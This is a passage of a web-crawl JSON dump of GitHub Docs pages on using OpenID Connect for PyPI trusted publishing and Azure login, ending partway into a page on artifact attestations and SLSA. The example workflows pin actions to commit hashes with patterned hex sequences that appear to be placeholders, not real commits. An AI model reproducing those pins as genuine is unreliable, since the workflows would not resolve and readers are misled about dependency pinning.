    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi",
    "title": "Configuring OpenID Connect in PyPI - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with PyPI.",
    "author": null,
    "keywords": "Security,Actions",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring OpenID Connect in PyPI - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "797A:71FBB:22EF:3030:681C5121",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:21 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686241.320862, VS0, VE308",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27166",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring OpenID Connect in PyPI\nUse OpenID Connect within your workflows to authenticate with PyPI.\nOverview\nOpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate with PyPI to publish Python packages.\nThis guide gives an overview of how to configure PyPI to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in the pypa/gh-action-pypi-publish action to publish packages to PyPI (or other Python package repositories) without any manual API token management.\nPrerequisites\nTo learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see About security hardening with OpenID Connect.\nBefore proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see About security hardening with OpenID Connect.\nAdding the identity provider to PyPI\nTo use OIDC with PyPI, add a trust configuration that links each project on PyPI to each repository and workflow combination that's allowed to publish for it.\nSign in to PyPI and navigate to the trusted publishing settings for the project you'd like to configure. For a project named myproject, this will be at https://pypi.org/manage/project/myproject/settings/publishing/.\nConfigure a trust relationship between the PyPI project and a GitHub repository (and workflow within the repository). For example, if your GitHub repository is at myorg/myproject and your release workflow is defined in release.yml with an environment of release, you should use the following settings for your trusted publisher on PyPI.\nNote\nEnter these values carefully. Giving the incorrect user, repository, or workflow the ability to publish to your PyPI project is equivalent to sharing an API token.\nOwner: myorg\nRepository name: myproject\nWorkflow name: release.yml\n(Optionally) a GitHub Actions environment name: release\nUpdating your GitHub Actions workflow\nOnce your trusted publisher is registered on PyPI, you can update your release workflow to use trusted publishing.\nNote\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see Managing environments for deployment.\nThe pypa/gh-action-pypi-publish action has built-in support for trusted publishing, which can be enabled by giving its containing job the id-token: write permission and omitting username and password.\nThe following example uses the pypa/gh-action-pypi-publish action to exchange an OIDC token for a PyPI API token, which is then used to upload a package's release distributions to PyPI.\nYAML\njobs: release-build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - uses: actions/setup-python@v5 with: python-version: \"3.x\" - name: build release distributions run: | # NOTE: put your own distribution build steps here. python -m pip install build python -m build - name: upload windows dists uses: actions/upload-artifact@v4 with: name: release-dists path: dist/ pypi-publish: runs-on: ubuntu-latest needs: - release-build permissions: id-token: write steps: - name: Retrieve release distributions uses: actions/download-artifact@v4 with: name: release-dists path: dist/ - name: Publish release distributions to PyPI uses: pypa/gh-action-pypi-publish@3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-pypi-vff0n.html",
  "markdown": "# Configuring OpenID Connect in PyPI\n\nUse OpenID Connect within your workflows to authenticate with PyPI.\n\n## [Overview](#overview)\n\nOpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate with [PyPI](https://pypi.org/) to publish Python packages.\n\nThis guide gives an overview of how to configure PyPI to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in the [`pypa/gh-action-pypi-publish`](https://github.com/marketplace/actions/pypi-publish) action to publish packages to PyPI (or other Python package repositories) without any manual API token management.\n\n## [Prerequisites](#prerequisites)\n\n*   To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n    \n*   Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n    \n\n## [Adding the identity provider to PyPI](#adding-the-identity-provider-to-pypi)\n\nTo use OIDC with PyPI, add a trust configuration that links each project on PyPI to each repository and workflow combination that's allowed to publish for it.\n\n1.  Sign in to PyPI and navigate to the trusted publishing settings for the project you'd like to configure. For a project named `myproject`, this will be at `https://pypi.org/manage/project/myproject/settings/publishing/`.\n    \n2.  Configure a trust relationship between the PyPI project and a GitHub repository (and workflow within the repository). For example, if your GitHub repository is at `myorg/myproject` and your release workflow is defined in `release.yml` with an environment of `release`, you should use the following settings for your trusted publisher on PyPI.\n    \n    Note\n    \n    Enter these values carefully. Giving the incorrect user, repository, or workflow the ability to publish to your PyPI project is equivalent to sharing an API token.\n    \n    *   Owner: `myorg`\n    *   Repository name: `myproject`\n    *   Workflow name: `release.yml`\n    *   (Optionally) a GitHub Actions environment name: `release`\n\n## [Updating your GitHub Actions workflow](#updating-your-github-actions-workflow)\n\nOnce your trusted publisher is registered on PyPI, you can update your release workflow to use trusted publishing.\n\nNote\n\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-protection-rules).\n\nThe [`pypa/gh-action-pypi-publish`](https://github.com/marketplace/actions/pypi-publish) action has built-in support for trusted publishing, which can be enabled by giving its containing job the `id-token: write` permission and omitting `username` and `password`.\n\nThe following example uses the `pypa/gh-action-pypi-publish` action to exchange an OIDC token for a PyPI API token, which is then used to upload a package's release distributions to PyPI.\n\nYAML\n\n```\njobs:\n  release-build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.x\"\n\n      - name: build release distributions\n        run: |\n          # NOTE: put your own distribution build steps here.\n          python -m pip install build\n          python -m build\n\n      - name: upload windows dists\n        uses: actions/upload-artifact@v4\n        with:\n          name: release-dists\n          path: dist/\n\n  pypi-publish:\n    runs-on: ubuntu-latest\n    needs:\n      - release-build\n    permissions:\n      id-token: write\n\n    steps:\n      - name: Retrieve release distributions\n        uses: actions/download-artifact@v4\n        with:\n          name: release-dists\n          path: dist/\n\n      - name: Publish release distributions to PyPI\n        uses: pypa/gh-action-pypi-publish@3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 236,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-pypi-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-pypi-removedElementsH",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-pypi-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-pypi-readableTextHtml",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-pypi-readableTextIfPo"
    },
    "lengths": {
      "extractus": 6924,
      "readableText": 6531,
      "none": 26235,
      "readableTextIfPossible": 26235,
      "result": 6531,
      "markdown": 4811
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure",
    "loadedTime": "2025-05-08T06:37:33.311Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure",
    "title": "Configuring OpenID Connect in Azure - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with Azure.",
    "author": null,
    "keywords": "Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring OpenID Connect in Azure - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "FA1C:AEB0:63F7:8214:681C5125",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:26 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686246.834476, VS0, VE322",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28194",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring OpenID Connect in Azure\nUse OpenID Connect within your workflows to authenticate with Azure.\nOverview\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Azure, without needing to store the Azure credentials as long-lived GitHub secrets.\nThis guide gives an overview of how to configure Azure to trust GitHub's OIDC as a federated identity, and includes a workflow example for the azure/login action that uses tokens to authenticate to Azure and access resources.\nPrerequisites\nTo learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see About security hardening with OpenID Connect.\nBefore proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see About security hardening with OpenID Connect.\nAdding the federated credentials to Azure\nGitHub's OIDC provider works with Azure's workload identity federation. For an overview, see Microsoft's documentation at Workload identity federation.\nTo configure the OIDC identity provider in Azure, you will need to perform the following configuration. For instructions on making these changes, refer to the Azure documentation.\nIn the following procedure, you will create an application for Microsoft Entra ID (previously known as Azure AD).\nCreate an Entra ID application and a service principal.\nAdd federated credentials for the Entra ID application.\nCreate GitHub secrets for storing Azure configuration.\nAdditional guidance for configuring the identity provider:\nFor security hardening, make sure you've reviewed About security hardening with OpenID Connect. For an example, see About security hardening with OpenID Connect.\nFor the audience setting, api://AzureADTokenExchange is the recommended value, but you can also specify other values here.\nUpdating your GitHub Actions workflow\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\nAdd permissions settings for the token.\nUse the azure/login action to exchange the OIDC token (JWT) for a cloud access token.\nNote\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see Managing environments for deployment.\nAdding permissions settings\nThe job or workflow run requires a permissions setting with id-token: write to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the permissions for id-token is not set to write, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see About security hardening with OpenID Connect.\nThe id-token: write setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\nUsing environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN).\nUsing getIDToken() from the Actions toolkit.\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT contents: read # This is required for actions/checkout \nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT \nYou may need to specify additional permissions here, depending on your workflow's requirements.\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the permissions setting for id-token should be explicitly set to write at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\nFor more information, see Reusing workflows.\nRequesting the access token\nThe azure/login action receives a JWT from the GitHub OIDC provider, and then requests an access token from Azure. For more information, see the azure/login documentation.\nThe following example exchanges an OIDC ID token with Azure to receive an access token, which can then be used to access cloud resources.\nYAML\nname: Run Azure Login with OIDC on: [push] permissions: id-token: write contents: read jobs: build-and-deploy: runs-on: ubuntu-latest steps: - name: 'Az CLI login' uses: azure/login@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0 with: client-id: ${{ secrets.AZURE_CLIENT_ID }} tenant-id: ${{ secrets.AZURE_TENANT_ID }} subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }} - name: 'Run az commands' run: | az account show az group list \nFurther reading\nUsing OpenID Connect with reusable workflows\nCommunicating with self-hosted runners",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-azure-ow10i.html",
  "markdown": "# Configuring OpenID Connect in Azure\n\nUse OpenID Connect within your workflows to authenticate with Azure.\n\n## [Overview](#overview)\n\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Azure, without needing to store the Azure credentials as long-lived GitHub secrets.\n\nThis guide gives an overview of how to configure Azure to trust GitHub's OIDC as a federated identity, and includes a workflow example for the [`azure/login`](https://github.com/Azure/login) action that uses tokens to authenticate to Azure and access resources.\n\n## [Prerequisites](#prerequisites)\n\n*   To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n    \n*   Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n    \n\n## [Adding the federated credentials to Azure](#adding-the-federated-credentials-to-azure)\n\nGitHub's OIDC provider works with Azure's workload identity federation. For an overview, see Microsoft's documentation at [Workload identity federation](https://docs.microsoft.com/en-us/azure/active-directory/develop/workload-identity-federation).\n\nTo configure the OIDC identity provider in Azure, you will need to perform the following configuration. For instructions on making these changes, refer to [the Azure documentation](https://docs.microsoft.com/en-us/azure/developer/github/connect-from-azure).\n\nIn the following procedure, you will create an application for Microsoft Entra ID (previously known as Azure AD).\n\n1.  Create an Entra ID application and a service principal.\n2.  Add federated credentials for the Entra ID application.\n3.  Create GitHub secrets for storing Azure configuration.\n\nAdditional guidance for configuring the identity provider:\n\n*   For security hardening, make sure you've reviewed [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud). For an example, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-subject-in-your-cloud-provider).\n*   For the `audience` setting, `api://AzureADTokenExchange` is the recommended value, but you can also specify other values here.\n\n## [Updating your GitHub Actions workflow](#updating-your-github-actions-workflow)\n\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\n\n1.  Add permissions settings for the token.\n2.  Use the [`azure/login`](https://github.com/Azure/login) action to exchange the OIDC token (JWT) for a cloud access token.\n\nNote\n\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-protection-rules).\n\n### [Adding permissions settings](#adding-permissions-settings)\n\nThe job or workflow run requires a `permissions` setting with [`id-token: write`](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the `permissions` for `id-token` is not set to `write`, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n\nThe `id-token: write` setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\n\n*   Using environment variables on the runner (`ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`).\n*   Using `getIDToken()` from the Actions toolkit.\n\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n```\n\nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n```\n\nYou may need to specify additional permissions here, depending on your workflow's requirements.\n\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the `permissions` setting for `id-token` should be explicitly set to `write` at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\n\nFor more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n### [Requesting the access token](#requesting-the-access-token)\n\nThe [`azure/login`](https://github.com/Azure/login) action receives a JWT from the GitHub OIDC provider, and then requests an access token from Azure. For more information, see the [`azure/login`](https://github.com/Azure/login) documentation.\n\nThe following example exchanges an OIDC ID token with Azure to receive an access token, which can then be used to access cloud resources.\n\nYAML\n\n```\nname: Run Azure Login with OIDC\non: [push]\n\npermissions:\n  id-token: write\n  contents: read\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Az CLI login'\n        uses: azure/login@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n\n      - name: 'Run az commands'\n        run: |\n          az account show\n          az group list\n```\n\n## [Further reading](#further-reading)\n\n*   [Using OpenID Connect with reusable workflows](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows)\n*   [Communicating with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 255,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-azure-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-azure-removedElements",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-azure-extractusHtmlUr",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-azure-readableTextHtm",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-azure-readableTextIfP"
    },
    "lengths": {
      "extractus": 10867,
      "readableText": 9933,
      "none": 33444,
      "readableTextIfPossible": 9933,
      "result": 9933,
      "markdown": 7823
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3",
    "loadedTime": "2025-05-08T06:37:34.919Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3",
    "title": "Using artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3 - GitHub Docs",
    "description": "Building software with reusable workflows and artifact attestations can streamline your supply chain security and help you achieve SLSA v1.0 Build Level 3.",
    "author": null,
    "keywords": "Actions,Security,Workflows",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3 - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1E92:1529D1:6721:8690:681C5128",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:28 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686248.419704, VS0, VE413",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26503",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3\nBuilding software with reusable workflows and artifact attestations can streamline your supply chain security and help you achieve SLSA v1.0 Build Level 3.\nIntroduction\nArtifact attestations are a great way to create unfalsifiable provenance and integrity guarantees for the software you build.\nBut remember that by itself, artifact attestations provides links, like the build instructions an artifact was built with, which meets SLSA v1.0 Build Level 2. To make an informed risk decision, it's up to you to follow those links and evaluate those build instructions.\nYou can take this a step further by requiring builds make use of known, vetted build instructions. A great way to do this is to have your build take place in a reusable workflow that many repositories across your organization share. Reusable workflows can provide isolation between the build process and the calling workflow, to meet SLSA v1.0 Build Level 3.\nBefore starting this guide, you should be familiar with:\nGenerating artifact attestations. See Using artifact attestations to establish provenance for builds.\nWriting and using reusable workflows. See Reusing workflows.\nStep 1: Configuring your builds\nFirst, we need to build with both artifact attestations and a reusable 